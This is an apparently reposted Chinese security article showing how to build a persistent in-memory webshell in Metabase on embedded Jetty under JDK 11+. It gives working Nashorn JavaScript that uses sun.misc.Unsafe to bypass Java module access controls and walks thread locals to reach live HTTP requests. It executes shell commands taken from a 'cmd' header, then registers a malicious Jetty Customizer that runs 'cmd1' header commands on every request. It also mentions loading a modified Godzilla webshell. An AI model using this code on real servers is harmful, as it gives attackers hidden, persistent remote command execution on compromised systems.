---
title: Metabase 高版本JDK下 嵌入式Jetty中的Customizer内存马实现
url: https://buaq.net/go-174825.html
source: unSafe.sh - 不安全
date: 2023-08-20
fetch_date: 2025-10-04T11:58:49.742315
---

# Metabase 高版本JDK下 嵌入式Jetty中的Customizer内存马实现

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

Metabase 高版本JDK下 嵌入式Jetty中的Customizer内存马实现

之前在Metabase 漏洞中实现了任意js脚本的执行,但是这并不优雅 每次都要发送完整的请求包.而且Metabase 的部署方法比较特殊 它打包成了一个独立ja
*2023-8-19 15:54:0
Author: [xz.aliyun.com(查看原文)](/jump-174825.htm)
阅读量:47
收藏*

---

之前在Metabase 漏洞中实现了任意js脚本的执行,但是这并不优雅 每次都要发送完整的请求包.

目标环境是 java 11.0.19+7 中间件是 Jetty 11.0.14
sink点是nashorn js引擎 下面例子都是js nashorn代码的实现
因为js引擎没有传入http请求的上下文 所以只能通过遍历线程的方法来获取上下文.

```
var threadGroup = java.lang.Thread.currentThread().getThreadGroup();
var field = ThreadGroup.class.getDeclaredField("threads");
field.setAccessible(true);
```

发现setAccessible执行的时候抛出了异常

```
Caused by: java.lang.reflect.InaccessibleObjectException:
Unable to make field java.lang.Thread[] java.lang.ThreadGroup.threads accessible:
module java.base does not "opens java.lang" to module jdk.scripting.nashorn.scripts
```

Java 9 及其以上的版本中 模块化系统(module system)被引入。模块化系统增加了对模块的隔离和访问控制，强制要求模块显式地声明对其他模块的公开与开放。
因为这个新增的安全特性.所以不能像在低版本java一样简单的通过反射的方法来访问私有属性.
但是仍然可以使用unsafe来强制访问私有属性绕过这个限制.
sun.misc.Unsafe 是 JDK 原生提供的一个工具类，包含了危险的方法例如内存分配与回收、CAS 操作、类实例化、内存屏障等。正如其命名一样，由于其可以直接操作内存，执行底层系统调用，其提供的操作也是比较危险的。

```
function getunsafe() {
  var unsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
  unsafe.setAccessible(true);
  return unsafe.get(null);
}
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155401-8f6dedcc-3e65-1.png)

```
//基于相对内存地址直接读取属性 不受所有修饰符限制
public Object getObject(Object o, long offset)
//获取非静态属性在它的类的内存分配中的位置(内存偏移地址)
public long objectFieldOffset(Field f)
```

拿到unsafe之后就可以获取之前获取不到的threads了

```
var unsafe = getunsafe();
var group = java.lang.Thread.currentThread().getThreadGroup();
var f = group.getClass().getDeclaredField("threads");
var threads = unsafe.getObject(group, unsafe.objectFieldOffset(f));
```

通过调试找到http上下文 \_request的位置
![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155401-8fbc2046-3e65-1.png)![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155402-901e80a6-3e65-1.png)
((HttpChannelOverHttp)((HttpConnection)((Thread)this).threadLocals.table[x].value).\_channel).\_request
不难发现\_request \_response 可以通过如下方式获取
((HttpConnection)((Thread)this).threadLocals.table[x].value).getHttpChannel().getResponse()
遍历threads 找到threadLocals->table->value 调用其中的getHttpChannel方法 就可以拿到我们需要的东西

```
for (var i = 0; i < threads.length; i++) {
    try {
        var f = threads[i].getClass().getDeclaredField("threadLocals");
        var threadLocals = unsafe.getObject(threads[i], unsafe.objectFieldOffset(f));
        var table = unsafe.getObject(threadLocals, unsafe.objectFieldOffset(threadLocals.getClass().getDeclaredField("table")));
        for (var j = 0; j < table.length; j++) {
            try {
                var valueField = unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField("value")));
                var w = valueField.getHttpChannel().getResponse().getWriter();
                w.println(exec(valueField.getHttpChannel().getRequest().getHeader("cmd")));
                w.flush();
            } catch(e) {

}
        }
    } catch(e) {

}
}
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155403-90804e08-3e65-1.png)
到这里我们实现了一个回显马

那么如何实现一个内存马呢?
跟踪代码堆栈 发现在分发http请求的时候有这么一段代码
![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155403-90e27308-3e65-1.png)

```
public boolean handle() {
......
this.dispatch(DispatcherType.REQUEST, () -> {
Iterator var1 = this._configuration.getCustomizers().iterator();
  do {
if (!var1.hasNext()) {
  this.getServer().handle(this);
return;
 }
      HttpConfiguration.Customizer customizer = (HttpConfiguration.Customizer)var1.next();
      customizer.customize(this.getConnector(), this._configuration, this._request);
  }
    while(!this._request.isHandled());
});
......
```

jetty 有一类叫做 customizer 的handler 看起来和tomcat的Valve类似

> HttpConfiguration.Customizer
> 允许自定义请求对象的接口 对于特定的 HTTP 连接器配置。 与过滤器不同，定制器是在提交请求进行处理之前应用，并且可以特定于接收请求的连接器。
> 通常customizer执行以下任务：
>
> * 处理可能由代理或负载均衡器注入的标头字段。
> * 可能来自连接/连接器的设置属性，例如 SSL 会话 ID
> * 如果请求已被卸载，则允许将请求标记为安全或经过身份验证 并通过 header、cookie 或其他带外机制进行通信
> * 设置由连接器确定的请求属性/字段请求已收到

实现一个Customizer

```
var ProxyCustomizer = Java.extend(org.eclipse.jetty.server.HttpConfiguration.Customizer, {
    customize: function(connector, channelConfig, request) {
        if (request.getHeader("cmd1") != null) {
            request.getResponse().getWriter().println(exec(request.getHeader("cmd1")));
            request.setHandled(true);
        }
    }
});
```

将自定义恶意Customizer添加到Configuration中

```
valueField.getHttpChannel().getHttpConfiguration().addCustomizer(new ProxyCustomizer());
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155404-91353a5c-3e65-1.png)现在已经实现了一个简单的java内存马
之后照猫画虎 魔改一下哥斯拉的马 稍微封装一下 这里留给读者自己动手实现 最后用unsafe绕过限制 加载class
![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155405-91968b72-3e65-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155405-91d495a2-3e65-1.png)
成功实现哥斯拉内存马
![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155405-92259d08-3e65-1.png)![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155406-925fc15e-3e65-1.png)![](https://xzfile.aliyuncs.com/media/upload/picture/20230819155406-92a665a0-3e65-1.png)

文章来源: https://xz.aliyun.com/t/12792
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)